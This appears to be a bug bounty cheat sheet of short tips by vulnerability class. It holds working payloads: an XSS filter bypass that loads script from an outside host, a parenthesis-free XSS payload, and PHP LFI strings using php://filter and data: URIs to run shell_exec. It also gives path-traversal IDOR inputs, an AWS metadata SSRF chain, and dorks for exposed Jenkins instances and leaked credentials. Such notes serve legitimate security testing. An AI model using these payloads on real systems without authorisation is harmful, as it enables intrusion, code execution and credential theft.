# Bug Bounty Tips

### XSS
- I love it when a site creates a filter to 'try' prevent something like XSS (or even certain file extensions from being uploaded:D). In this case, [xss filter bypass: </script><%0dscript%20src=\http://mysite.com/yay.js>](https://www.bugbountynotes.com/forum/viewpost?id=100)
- Have you ever come across an issue, where you could pop XSS but parenthesis () gets filtered ? this payload ``onfocus="alert`1`"autofocus=`` will bypass that problem.
- If you open the url in the browser and see nothing but blank page, do not assume there is nothing there.
  - ALWAYS check the source code. There might be a bunch of JavaScript or e.g. some commented source code from server.
- ALWAYS check the full response on any request. Errors can sometimes give u the keys to the kingdom if u actually figure out what ur looking at witin the error response.

### IDOR

- When you're looking at an asset that may use a microservices architecture, look for IDOR vulnerabilities using path traversal. E.g. `https://example/?id=1/../2`.
  - The authorization check may pass because the user is allowed to see resource 1 and the system ignores /../2 in the authorization layer. This could work because some microservice architectures use HTTP to transport messages.
  - When one of the microservices implemented an HTTP endpoint like "/resource/:id" and it trusts the message from the sender, you may end up requesting "/resource/1/../2", which resolves to "/resource/2", given you access to an object you may not be authorized to see.
  - Yeah, I have encountered several issues of this type. like `https://example/?id=1/.../..../..../id=2` but never ended up in path traversal vulnerabilities.

### Information Disclosure

- Want to find some internal code of companies or some sample codes of new features? Checkout with: `site:http://repl.it  intext:<companydomain>`. In companydomain, if you know the internal domain it is even better.
  - `site:http://gist.github.com`
- Search for public Trello boards of companies, to find login credentials, API keys, etc. Or if you aren't lucky enough, then you may find companies' Team Boards sometimes with tasks to fix security vulnerabilities.

### SSRF

- a = Find fixed SSRF. b = Find open redirection in whitelisted domains. C = Amazon Aws metadata API.
  - a+b+C = Boom.

### LFI

- When lfi doesnt work to get `/etc/passwd` for example, you can always try to get source code disclosure by using the function of php://filter: `php://filter/convert.base64-encode/resource=index`
- When you came up with a file= parameter before trying for other rfi see phpinfo page is accessible or not you might get some juicy information. e.g.`file=data:text/plain, <?php phpinfo(); ?>`
  - Why prefer phpinfo() when you can `data:text/plain, <?php echo shell_exec("ls"); ?>`? (in both cases, allow_url_include=1).
  
### CSRF

- When testing for CSRF, send the POST parameters using GET method, eg: `GET /[post endpoint]?postprm1=value&postprm2=value2`. You will be surprised how many developers forget to add csrf protection on GET methods of the same endpoints.
  
### Higher Privilege

- If a website does not verify email, try signing up with <whatev>@domain.com (the company email). Sometimes this gives you higher privilege like deleting/viewing any other user's profiles etc.
  
### Hiden Endpoints

- A redirect to SSO does not always mean that every endpoints are behind the SSO. Specially if it is a popular instance like JIRA, Confluence etc, check to see if you can still hit endpoints like search sections, filters etc.

### Jenkins

- Sometime an open Jenkins dashboard can be as critical as below finding. A Shodan query to list all such publically accessible Jenkins Instance: `https://www.shodan.io/search?query=x-jenkins+200`
- sometimes you find those PATHs that forwards to a login page & you can't see the content inside them (ex: `/path/to/secret` --> Google login).
  - Take all these PATHs, prepend `/public/` to all of them as: `/public/path/to/secret`, got access to a Jenkins instance.

### HTTP Methods

- If server only allows GET and POST method, then try adding "X-HTTP-Method -Override: PUT to achieve RCE via PUT method.

### TOOLS
  
- Don't forget the google dorks, sometimes when you can't find nothing, let google find something for you. Check [this list of advanced google dorks](https://pastebin.com/zYPZNbMK) and use them.
  - Use of Google dorks and the site operator is a good way to identify vulnerable apps on sites with bounty. The inurl:/OA_HTML to get [unpatched instances with XSS or SQLi](https://the-infosec.com/2018/11/06/oracle-ebs-security-auditing/) is one of them.
  - To discover domains deployed on Github for subdomain takeover, following google dork can be used :- intext:"There isn't a Github Pages site here" and intitle:"Site not found · GitHub Pages"
- Debugging Javascript can yield gold. You can edit source files directly by enabling "Local Overides" in Chrome. Changes made will persist, even after you refresh the page! 
